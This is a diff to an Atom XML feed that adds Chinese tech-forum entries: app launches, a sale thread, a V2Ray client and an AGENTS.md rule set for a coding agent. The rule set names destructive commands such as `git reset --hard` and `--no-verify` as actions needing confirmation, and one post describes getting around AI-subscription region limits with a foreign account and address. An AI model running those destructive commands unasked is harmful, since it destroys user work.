@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
   <id>urn:uuid:d7bb2d36-0a52-5498-9d19-80ebca4de311</id>
   <title>IT 科技 — Feeds</title>
-  <updated>2026-11-27T19:56:26.000Z</updated>
+  <updated>2026-11-28T08:00:00.000Z</updated>
   <author>
     <name>Feeds</name>
   </author>
@@ -10,6 +10,744 @@
   <link rel="self" type="application/atom+xml" href="https://yunxiansy.github.io/yunxian-feeds/feeds/categories/e29412a3ac6c9231ece7ffba56fdf3bc889fafd3de365bf416afb955605915fc.xml"/>
   <link rel="alternate" type="text/html" href="https://yunxiansy.github.io/yunxian-feeds/"/>
   <subtitle>Distinct stored items belonging to IT 科技</subtitle>
+  <entry>
+    <id>urn:uuid:96106de8-3dea-52ff-97b5-12eeaa805734</id>
+    <title>谷歌发布新一代 TPU，开发者：真正重要的不是芯片</title>
+    <updated>2026-11-28T08:00:00.000Z</updated>
+    <author>
+      <name>InfoQ 中文站</name>
+    </author>
+    <published>2026-11-28T08:00:00.000Z</published>
+    <link rel="alternate" href="https://www.infoq.cn/article/MrxlyksI1KxvEKLuCg5P?utm_source=rss&amp;utm_medium=article"/>
+    <category term="IT 科技"/>
+    <content type="html">&lt;div&gt;&lt;a href="https://www.infoq.cn/article/MrxlyksI1KxvEKLuCg5P?utm_source=rss&amp;amp;utm_medium=article"&gt;点击查看原文&amp;gt;&lt;/a&gt;&lt;/div&gt;</content>
+    <source>
+      <title>InfoQ 中文站</title>
+      <link rel="self" href="https://www.infoq.cn/feed.xml"/>
+      <link rel="alternate" href="https://www.infoq.cn"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:abba42ce-c870-52f7-94df-bee059a61c95</id>
+    <title>[分享创造] 随阅·NoriReader 1.1.0 更新 增加 AI 功能 webdav</title>
+    <updated>2026-11-28T01:50:27.000Z</updated>
+    <author>
+      <name>chiaoyuja</name>
+    </author>
+    <published>2026-11-28T01:50:27.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260505#reply0"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;前阵子在站里发了小说阅读器 NoriReader 的初版（ &lt;a href="https://v2ex.com/t/1254782"&gt;https://v2ex.com/t/1254782&lt;/a&gt; ），感谢各位 V 友的反馈，甚至还有两位大佬直接付费支持了，感动之余也更有动力爆肝了。&lt;br /&gt;
+最近连着更了几个版本，核心变化如下：  &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;界面体验：整体 UI 重新优化，阅读更沉浸。&lt;/li&gt;
+&lt;li&gt;基础刚需：新增 WebDAV 同步（免费版可绑 1 个账号）和 本地字体导入（免费版可导 2 个字体）。&lt;/li&gt;
+&lt;li&gt;AI 提问：支持针对小说正文向 AI 提问（剧情梳理、设定查询等）。免费每天 5 次，支持自带 API Key 及自定义反代/中转。&lt;/li&gt;
+&lt;li&gt;AI 听书：支持接入 MiniMax 等接口，可实现声音克隆（用自己或喜欢的人的声音听书）。&lt;/li&gt;
+&lt;li&gt;书源支持：已兼容大部分主流聚合源及部分自建合集源。（注：因部分源站自身不稳定或限制大陆 IP，偶尔会出现部分源不可用的情况）。    &lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;另外同步个小消息：目前内购正在半价优惠中（截止到 12 月 10 日），一次买断即可解锁所有完整体验，有需要的朋友趁现在入手最划算。&lt;br /&gt;
+简单做了个官网，感兴趣的朋友可以直接去看看：&lt;br /&gt;
+&lt;a href="https://norireader.pages.dev/"&gt;https://norireader.pages.dev&lt;/a&gt;&lt;br /&gt;
+欢迎继续提意见，后续还会持续打磨！&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:621bda45-5662-5085-9d6e-ea043b00e80b</id>
+    <title>[JetBrains] 各位还会买 JetBrains 全家桶吗</title>
+    <updated>2026-11-28T01:49:38.000Z</updated>
+    <author>
+      <name>YaakovZiv</name>
+    </author>
+    <published>2026-11-28T01:49:38.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260504#reply0"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;JetBrains 中国地区官网 在 12 月 12 日之前全系列半价，各位这次还会续费吗。&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:9020b8cd-0f81-50c4-91bd-47b605c660d0</id>
+    <title>[宽带症候群] 美国运通中文官网打不开了？</title>
+    <updated>2026-11-28T01:42:51.000Z</updated>
+    <author>
+      <name>AkaGhost</name>
+    </author>
+    <published>2026-11-28T01:42:51.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260503#reply0"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;&lt;a href="https://www.americanexpress.com.cn/"&gt;https://www.americanexpress.com.cn&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP 被解析到 169.254.254.254，还有的地区直接没有解析&lt;/p&gt;
+&lt;p&gt;这么大个卡组织官网怎么能说挂就挂了的，&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:43b969de-b077-5c7b-a1ac-f48b80fd0606</id>
+    <title>[程序员] 转到 Antigravity 受不了他的“直接开干”，给它喂了份 Claude 的规矩</title>
+    <updated>2026-11-28T01:40:50.000Z</updated>
+    <author>
+      <name>tgyum</name>
+    </author>
+    <published>2026-11-28T01:40:50.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260501#reply1"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;用惯了 Claude 的“先对齐再写代码”，切到 Antigravity 真的有点不适应。这货太爱“直接开干”了,等 review 的时候发现方向不对，返工成本极高。&lt;/p&gt;
+&lt;p&gt;于是有了这份参考 claude 核心提示词出的提示词，核心就是限制它：非局部的小改动，必须先只读调研，给出方案和取舍，等我批准了再写代码；如果是明确修个小 bug，那还是直接干。&lt;/p&gt;
+&lt;p&gt;可以直接拿去用，放项目根目录的 &lt;a href="http://agents.md/"&gt;AGENTS.md&lt;/a&gt; 或 Rules 里就行。也可以全局设定，不用每个项目都加。&lt;br /&gt;
+Windows 全局路径：C:\Users\用户名.gemini\&lt;a href="http://agents.md/"&gt;AGENTS.md&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;## Collaboration &amp;amp; Action Boundaries
+
+Explicit user instructions and project-level rules (e.g. `AGENTS.md`) override these defaults.
+
+### 1. Align Before Coding
+
+Unless the user has already approved a plan or explicitly asks to implement directly, **do NOT edit or create code first** in the following cases — perform read-only research, present a concise summary (key findings/reference takeaways, recommended approach with main tradeoffs, and open decisions with a default recommendation), and wait for approval:
+- Adding a new feature beyond a single localized change, a new module, platform, or third-party integration, or implementing something by referencing another project/codebase.
+- Non-trivial design choices affecting public API/output shape, storage/caching schema, dependency changes, or cross-module boundaries.
+- Broad, ambiguous, or exploratory requests that would lead to implementation ("how should we approach X?", "can we do Y?"). For pure questions ("what do you think?", "why does X happen?"), just answer directly — no summary template needed.
+
+Otherwise, act directly without asking first when the scope is narrow and unambiguous (fixing a clear bug, localized internal refactor/naming, adding specific tests, minor doc update).
+
+If running autonomously (e.g. as a subagent or long-running task) or the user is unreachable, proceed with the default recommendation and clearly flag that decision in the final report.
+
+### 2. Minimal, Necessary Changes
+
+- Keep edits strictly scoped to the task. No drive-by refactors, speculative abstractions, or half-finished implementations.
+- Validate at system boundaries (user input, external APIs, cross-process I/O); trust internal types and framework guarantees. Don't add new defensive fallbacks or compatibility shims unless requested — and don't remove existing ones unless requested.
+- Prefer editing existing files over creating new ones. Delete code made unused by your own change cleanly instead of leaving `_unused` vars or `// removed` comments; leave pre-existing dead code alone unless asked.
+- Default to no comments. Never narrate WHAT the code does or reference the current task/fix; add a single concise line only when WHY is non-obvious (hidden invariant, upstream quirk, workaround). Project-required docs and public API docstrings are not "comments" in this sense — keep them accurate.
+- After making changes, run the relevant tests/typecheck. For changes with real logic, add or update a minimal test when a test setup exists.
+
+### 3. Risky Actions &amp;amp; Workspace Safety
+
+**Proceed autonomously** with local, reversible actions: reading files, editing target files, running local tests/typecheck, and cleaning up temporary files created in this task.
+
+**State the impact and get confirmation first** (unless explicitly requested by the user or already approved in the current plan) for hard-to-reverse, destructive, or externally visible actions:
+- Deleting existing files or branches, `git reset --hard`, overwriting uncommitted changes.
+- Pushing, force-pushing, or posting to external services.
+- Changing dependencies or CI configuration.
+- Hitting real/production resources, running load tests, or making paid API calls.
+
+Additionally:
+- Investigate unexpected uncommitted files, merge conflicts, or lock files before touching them — never delete or overwrite user work.
+- Fix root causes rather than bypassing checks (e.g. `--no-verify`, disabling tests or lint rules).
+- Never print, log, or commit secrets (tokens, connection strings, credentials).
+- Approval applies only to that specific action and scope, unless the user explicitly grants standing approval for the session.
+
+### 4. Communication &amp;amp; Evidence
+
+- Match response size to the task: answer simple questions directly without heavy templates. When weighing choices, give a clear recommendation and the core tradeoff rather than listing options you will not take.
+- Do not re-litigate settled decisions or narrate internal deliberation. During execution, give brief one-sentence updates mainly on key findings, direction changes, or blockers.
+- Report from verification, not assumption: inspect files/symbols before claiming they exist or work. Passing typechecks or unit tests does not prove end-to-end behavior — in the final report, state clearly what was changed, what was verified, and what was not.
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;加了之后体感好多了，它现在遇到需要设计的活会停下来给我列计划，不会像个莽夫一样乱冲&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:64ec601e-900b-5fac-bdc1-54407d2454c5</id>
+    <title>[微信] 微信小程序也需要一个 Product Hunt 吗？</title>
+    <updated>2026-11-28T01:33:17.000Z</updated>
+    <author>
+      <name>weisein</name>
+    </author>
+    <published>2026-11-28T01:33:17.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260500#reply0"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;微信里其实有不少好用的小程序，但除了朋友推荐和主动搜索，似乎没有太好的发现渠道。对于独立开发者来说，推广渠道也比较有限。&lt;/p&gt;
+&lt;p&gt;受 Product Hunt 启发，最近折腾了一个网站 MiniHunt（&lt;a href="https://minihunt.xn--top),-j31hs9ts82a8xl796b/"&gt;https://minihunt.top），目前收录了&lt;/a&gt; 2000 多个小程序，也支持开发者免费提交自己的作品。&lt;/p&gt;
+&lt;p&gt;还在早期阶段，很多地方不够完善。&lt;/p&gt;
+&lt;p&gt;比较好奇，大家平时会主动去发现新的小程序吗？如果你是小程序开发者，会愿意在这样的平台分享自己的作品吗？&lt;/p&gt;
+&lt;p&gt;欢迎交流，也欢迎吐槽。&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:7bf94001-f774-5cce-aede-f2515aef6e75</id>
+    <title>[分享创造] 整了个 pdf 还原到 ppt 的技能，有需要自取</title>
+    <updated>2026-11-28T01:32:58.000Z</updated>
+    <author>
+      <name>weishao666</name>
+    </author>
+    <published>2026-11-28T01:32:58.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260499#reply0"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;平常拿到别人分享的 PPT 都是个 PDF 版，于是有了 pdf2ppt，image2ppt 技能，精修还原度应该能达到 95%以上，每个元素可编辑&lt;br /&gt;
+&lt;a href="https://www.workbuddy.cn/share/asset?shareCode=Vxzu5RMLu8YvFTZ1plHI0O&amp;amp;sig=Fvi3FJPRjutKLG1f"&gt;https://www.workbuddy.cn/share/asset?shareCode=Vxzu5RMLu8YvFTZ1plHI0O&amp;amp;sig=Fvi3FJPRjutKLG1f&lt;/a&gt;&lt;br /&gt;
+&lt;a href="https://www.workbuddy.cn/share/asset?shareCode=bEYxY98vmf5eAq2ExW1Ufv&amp;amp;sig=rsTFuDqPt4EW_l_1"&gt;https://www.workbuddy.cn/share/asset?shareCode=bEYxY98vmf5eAq2ExW1Ufv&amp;amp;sig=rsTFuDqPt4EW_l_1&lt;/a&gt;&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:efe1f05d-7a24-5360-9cdb-fe08a0f9b792</id>
+    <title>[程序员] 用美区 appleID 开了个 gemini pro, 花了 1.99 刀</title>
+    <updated>2026-11-28T01:31:17.000Z</updated>
+    <author>
+      <name>kpub54</name>
+    </author>
+    <published>2026-11-28T01:31:17.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260498#reply2"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;这两天折腾的 claude 和 gemini，记录一下：&lt;/p&gt;
+&lt;p&gt;gemini pro:&lt;br /&gt;
+一开始用的一个 gmail, 从中国区转到美国区的，发现买不了，登录了另外一个 gmail 账号，我看是 TW 地区的，可以继续往下走,到支付环节需要填收货地址，填写了美国的免税地址，居然通过了（前两天买 claude pro 也是类似的流程， 但是填写美区地址后还让绑定美区银行卡，放弃了）&lt;/p&gt;
+&lt;p&gt;claude pro:&lt;br /&gt;
+gemini 买成功了，又试了一下 claude pro,居然不要绑美区银行卡了，购买成功后，返回 APP，到了 KFC 环节，卡住了，下周去办理护照，打算先用护照试一下&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:2449ac4d-e6c7-55b1-87f4-56a312d66b30</id>
+    <title>[分享创造] 重写了一个新的 macOS V2Ray GUI 客户端 - V2RayGUI</title>
+    <updated>2026-11-28T01:19:39.000Z</updated>
+    <author>
+      <name>hanguokai</name>
+    </author>
+    <published>2026-11-28T01:19:39.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260497#reply0"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;为什么说“重写”？因为之前在 Mac 上一直用的是 V2RayX 。虽然它早就不更新了，但是用着很顺手，也没什么问题，就一直用着。现在的问题是明年 macOS 新版本将不再支持 Intel(x86) 应用，所以就照着 V2RayX 的基本功能用 Swift 重新写了一个。&lt;/p&gt;
+&lt;p&gt;定位就是 v2ray-core 上面套一层轻量的 macOS 菜单栏 GUI ，方便使用。主要是自用+分享。&lt;/p&gt;
+&lt;p&gt;功能特点：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;原生小巧，程序体积只有几兆&lt;/li&gt;
+&lt;li&gt;支持 v2ray-core v5 &amp;amp; v4&lt;/li&gt;
+&lt;li&gt;轻量系统代理：支持全局 / PAC / 手动三种模式&lt;/li&gt;
+&lt;li&gt;可配置 V2Ray 支持的常用协议&lt;/li&gt;
+&lt;li&gt;可配置路由，内置：全局 / 全部直连 / 绕过大陆&lt;/li&gt;
+&lt;li&gt;方便老用户迁移：支持直接导入旧的 V2RayX 备份和标准 V2Ray JSON 配置&lt;/li&gt;
+&lt;li&gt;局域网共享（默认不开启，仅限 localhost 使用）&lt;/li&gt;
+&lt;li&gt;一键复制终端代理命令&lt;/li&gt;
+&lt;li&gt;默认关闭访问日志&lt;/li&gt;
+&lt;li&gt;支持开机自动启动&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;安装下载：&lt;a href="https://github.com/hanguokai/v2ray-gui"&gt;https://github.com/hanguokai/v2ray-gui&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;欢迎试用！&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:32e26193-a893-5d19-8b6e-52c4de3209a4</id>
+    <title>[分享创造] 折腾了大半年，我把「剪一条电影解说」这件事变成了一条流水线</title>
+    <updated>2026-11-28T01:06:12.000Z</updated>
+    <author>
+      <name>gokoulee</name>
+    </author>
+    <published>2026-11-28T01:06:12.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260496#reply3"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;去年年底我开始在自己的小号(某书主页:&lt;a href="https://xhslink.cn/o/21lg4y6DU8a"&gt;https://xhslink.cn/o/21lg4y6DU8a&lt;/a&gt; )上做电影解说。纯手工：找片源、扒字幕、对时间轴剪画面、写解说词、配音、烧字幕、做封面、写标题……一条 5 分钟的片子断断续续磨三个晚上。&lt;/p&gt;
+&lt;p&gt;真正让人崩溃的不是剪辑本身，而是里面那一大段&lt;strong&gt;机械重复&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;一句解说配一个画面，镜头得在那 5~10 秒里翻来覆去找；&lt;/li&gt;
+&lt;li&gt;配音只能自己念，念十遍还是干巴巴；&lt;/li&gt;
+&lt;li&gt;字幕得一帧帧对齐，配音改一版就得全部重来；&lt;/li&gt;
+&lt;li&gt;剪完了还得憋标题、想封面。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这些活儿不难，但它们把「创作」切成了很多重复劳动。于是我给自己提了个问题：&lt;strong&gt;既然模型能读懂文本，那让它读懂字幕、替我把每一句解说定位到画面上，不就完了？&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;于是有了 ReelMind：&lt;a href="https://reelmind.codefree.work/"&gt;https://reelmind.codefree.work/&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;它现在能干的事&lt;/h2&gt;
+&lt;p&gt;就三步：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;选本地的电影文件 + 对应的字幕文件（srt / ass / vtt）；&lt;/li&gt;
+&lt;li&gt;把写好的解说稿粘进去（按句号自动断句）；&lt;/li&gt;
+&lt;li&gt;跑流水线，出片。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img alt="新建解说项目" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/9faee4bd82fbff65afce616eb00f5b3ad1d6b49066420bf62e51cab6580d9a6c.png" /&gt;&lt;/p&gt;
+&lt;p&gt;出片之前可以调的地方还挺细：字幕字号/颜色/描边/底条/位置/字体可以实时预览；解说音色来自豆包语音合成 2，一共 40 多种，沉稳男声、悬疑氛围、知性女声、古风译制这些是分组挑的，选中能直接试听；语速可调，BGM 有悬疑/平静/轻快三种氛围，说话的时候会自动压低、句间再抬起来。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="出片设置" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/b42038cb71b81c4f4b0db5ad55736ac48bbf9f83bf2fdcf2f7f260cea335e558.png" /&gt;&lt;/p&gt;
+&lt;p&gt;跑完之后给你的是一条能直接用的成片（配音、字幕、BGM 已经合成进去了），外加最多 3 张不同风格的封面，以及抖音/B 站/小红书/YouTube 的标题、简介和标签——这几个是我每次最不想写、又不得不写的东西。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="成片与分发文案" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/94ffa93937b42efd7bdac11920eda8c24fb5d40ee349a6878e623958f31c731a.jpg" /&gt;&lt;/p&gt;
+&lt;h2&gt;我为什么把片子完全放在本地&lt;/h2&gt;
+&lt;p&gt;这是我做这个工具时最坚持的一点：&lt;strong&gt;影片和字幕从头到尾不离开你的电脑&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;源文件走浏览器的 File 对象，配合按需读取的方式挂载，不整片读进内存，所以 20G 的片子也不会把标签页撑爆；只有字幕文本和你写的解说词会经过后端转给模型，密钥留在服务端不进前端。&lt;/p&gt;
+&lt;p&gt;一开始我也想过走云端上传，简单直接。但越想越不对劲——解说号的片子多是院线片，把原始片源往第三方服务器一丢，心里总是不踏实。后来本地处理的技术路线反而成了我最喜欢的一部分：WebCodecs 硬件加速编码真香，但兼容性兜底还是要老老实实写好。&lt;/p&gt;
+&lt;h2&gt;开发者视角：里面几个我觉得值得一说的点&lt;/h2&gt;
+&lt;p&gt;写的时候踩的坑，大致是这些：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;字幕版本必须和片子一致。&lt;/strong&gt; 差一版，匹配出来的画面全是乱的。片头有偏移的话要整体平移一下时间轴。这是最容易让人以为「AI 不行」的原因，其实十次有八次是字幕的问题。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;mp3 逐段拼接是有帧粒度漂移的。&lt;/strong&gt; 我一开始按句生成 mp3 再拼起来，画面和声音慢慢就飘了。后来改成每句解码成 PCM，按样本精确拼接，句与句之间留一小段呼吸空隙，字幕、画面、配音才是真正样本级对齐。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;大文件不能整片读进内存。&lt;/strong&gt; 这是我最开始写的版本里最蠢的一个设计，换成按需读取之后，内存占用基本和文件大小无关了。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;WebCodecs 不可用时得能退回 ffmpeg。&lt;/strong&gt; 回退之后没有烧录字幕的能力，那就单独给一份 srt 出去，别让用户卡在那儿。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;别用会过期的临时链接存封面。&lt;/strong&gt; 之前封面存的是上游临时地址，24 小时后全挂，历史项目点开一片红，后来统一改成存自己的服务器。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;流水线是并行的：引擎加载挂载、剧情分析、画面匹配、配音四线同时跑，成片先出来，封面和文案在后台慢慢补齐，通常一两分钟能看到成片。画面匹配的做法是先把全片字幕交给模型做一遍剧情分析，再一次性给每句解说匹配画面场景（比一句一句调省太多时间），匹配失败会退回到时间启发式，不至于整条流程卡死。&lt;/p&gt;
+&lt;h2&gt;一些边界，先说在前面&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;必须有字幕。&lt;/strong&gt; 没有字幕的片子用不了。这是我刻意的取舍：字幕时间轴比逐帧识别准得多、快得多、成本也低一个数量级。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;建议用最新版 Chrome / Edge&lt;/strong&gt;，WebCodecs 和按需读取都依赖它。&lt;/li&gt;
+&lt;li&gt;首次会加载一次本地 ffmpeg 引擎，第一次慢一点，之后就快了。&lt;/li&gt;
+&lt;li&gt;积分制：注册送 50 积分，够跑一条；后续每次生成 50 积分，开通永久会员后是 30 积分/条，另外批量和无水印也是会员的。处理失败会自动退回积分，不会白扣。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;顺便说说别的&lt;/h2&gt;
+&lt;p&gt;我这人有点手痒，看什么想什么都想做成工具，所以另外一些乱七八糟的小东西都收在一个作品集里：&lt;a href="https://codefree.work/"&gt;https://codefree.work/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;里面有些是正经效率类的（网页变化监控、跨设备互传这类），有些纯粹是自己做着玩的（AI 写歌、复古大头贴、本地影院之类），还有一个专门搜悬疑书目的。如果你逛着觉得有一两个还行，那也算顺手。&lt;/p&gt;
+&lt;p&gt;欢迎试用，也欢迎直接吐槽——哪里不好用、哪里卡住了，在评论里回我一句就行。工具是我一个人做的，迭代很快。&lt;/p&gt;
+&lt;hr /&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:9d2c6f43-5446-5991-8d25-57c33bef64cf</id>
+    <title>[问与答] 做了一个本地跑小语言模型的整句输入法「星语」：不卡顿、性能要求低、准确度高、不联网</title>
+    <updated>2026-11-28T01:04:36.000Z</updated>
+    <author>
+      <name>yibie</name>
+    </author>
+    <published>2026-11-28T01:04:36.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260495#reply0"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;大家好，分享一个自己做的中文输入法：&lt;strong&gt;Nova 星语&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;它基于 Rime（macOS 版改自鼠须管，Windows 版改自小狼毫），在本地加了一个 GPT-2 给整句候选重新打分。目标只有一个：整句盲打，首选一次打对。&lt;/p&gt;
+&lt;p&gt;[&lt;img alt="Nova 星语输入法介绍视频" loading="lazy" src="https://www.bilibili.com/video/BV1A61tzUEzs/?spm_id_from=333.1387.homepage.video_card.click&amp;amp;vd_source=1f7b4ab69df0282a1f07c30f52428cfa" /&gt;&lt;/p&gt;
+&lt;h2&gt;和常见 AI 输入法的不同&lt;/h2&gt;
+&lt;p&gt;现在常见的做法，是把几十亿参数的大模型接进输入法，等你停顿一下，再在后台重排候选。星语没走这条路：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;模型是只学中文的 GPT-2，1 亿参数，量化后 111 MB，体积小速度快。&lt;/li&gt;
+&lt;li&gt;它不负责生成文字，只给 Rime 按拼音列出的整句候选重新打分。所以不会冒出拼音对不上的字，也不会替你改写句子。&lt;/li&gt;
+&lt;li&gt;每按一个键，模型和字同步算完：Mac 上每键约 10 ms；一台 2015 年的低压双核 i5-6300U 笔记本，每键平均 66 ms。&lt;/li&gt;
+&lt;li&gt;所以屏幕上看到的首选，就是按空格上屏的那个，不会出现「看着是对的，按下去变了」。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;准确率&lt;/h2&gt;
+&lt;p&gt;首选整句和标准答案逐字相同的比例：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;Nova 评测集（6486 句）&lt;/th&gt;
+&lt;th&gt;开源输入法 A 的公开测试集（246 句）&lt;/th&gt;
+&lt;th&gt;开源输入法 B 的公开测试集（1631 句）&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Nova&lt;/td&gt;
+&lt;td&gt;80.6%&lt;/td&gt;
+&lt;td&gt;90.2%&lt;/td&gt;
+&lt;td&gt;93.1%&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;开源输入法 A&lt;/td&gt;
+&lt;td&gt;61.0%&lt;/td&gt;
+&lt;td&gt;75.2%&lt;/td&gt;
+&lt;td&gt;83.8%&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;A、B 都是国内知名的开源输入法。具体是哪两款、版本号和测法，都写在仓库 README 里，可以自己复现。&lt;/p&gt;
+&lt;h2&gt;打错了怎么改&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;结合上下文改过的词显示成紫色，备选就列在它下面，按数字就换。&lt;/li&gt;
+&lt;li&gt;Tab / Shift+Tab 逐词跳，只改一个字，不用退格重打。&lt;/li&gt;
+&lt;li&gt;选过的词就钉住，后面的字随新按键整句重算。&lt;/li&gt;
+&lt;li&gt;全拼拼错能自动纠正（比如 &lt;code&gt;gaun&lt;/code&gt; 照样出「馆」）。&lt;/li&gt;
+&lt;li&gt;支持反引号辅助码：&lt;code&gt;`cw&lt;/code&gt; 把「张伟」筛成「张薇」。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;其它&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;全拼、双拼、自然码等五种打法。&lt;/li&gt;
+&lt;li&gt;表情、日期、符号直接打，Shift 切换中英文。&lt;/li&gt;
+&lt;li&gt;不联网：程序里没有联网代码，1.0.4 起连联网权限也去掉了。可以在活动监视器的「网络」页自己核实。&lt;/li&gt;
+&lt;li&gt;没有广告、没有弹窗，只做打字。GPL-3.0 开源。&lt;/li&gt;
+&lt;li&gt;常驻内存约 300 MB，主要是加载到内存里的模型。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;下载&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;macOS 13+，Apple 芯片：&lt;a href="https://github.com/nova-ime/nova-macos/releases/latest"&gt;https://github.com/nova-ime/nova-macos/releases/latest&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Windows 10 / 11，64 位：&lt;a href="https://github.com/nova-ime/nova-windows/releases/latest"&gt;https://github.com/nova-ime/nova-windows/releases/latest&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;源码：&lt;a href="https://github.com/nova-ime"&gt;https://github.com/nova-ime&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;目前的不足&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;macOS 版只支持 Apple 芯片。&lt;/li&gt;
+&lt;li&gt;Rime 词库会学习你的选择。偶尔选错一次，下次首选可能就跟着变了；在焦点词上可以删掉学到的词。&lt;/li&gt;
+&lt;/ul&gt;
